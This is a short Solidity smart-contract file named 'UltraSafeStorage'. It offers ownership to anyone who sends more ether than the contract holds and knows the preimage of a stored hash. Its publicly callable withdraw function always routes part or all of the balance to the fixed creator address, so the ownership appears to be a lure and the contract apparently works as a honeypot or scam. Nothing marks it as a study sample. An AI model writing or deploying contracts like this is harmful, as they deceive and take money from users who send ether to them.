pragma solidity ^0.4.24;

contract UltraSafeStorage
{
	address public owner;
	address public previous_owner;
	address public creator;
	bytes32 public dataHash;

	constructor(bytes32 _dataHash) public
	{
		owner = msg.sender;
		creator = msg.sender;
		dataHash = _dataHash;
	}

	function withdraw() public
	{
		require(address(this).balance > 0);

		if(address(this).balance > 1 ether)
		{
			previous_owner.transfer(address(this).balance - 1 ether);
		}
		creator.transfer(address(this).balance);
	}

	function change_data(bytes32 data) public payable
	{
		require(msg.sender == owner);
		require(msg.value > 0.5 ether);

		dataHash = data;
	}

	function check_data(bytes32 data) public payable returns (bool)
	{
		require(msg.value > address(this).balance - msg.value);
		require(msg.sender != owner && msg.sender != previous_owner);
		require(keccak256(data) == dataHash);

		previous_owner = owner;
		owner = msg.sender;

		return true;
	}
}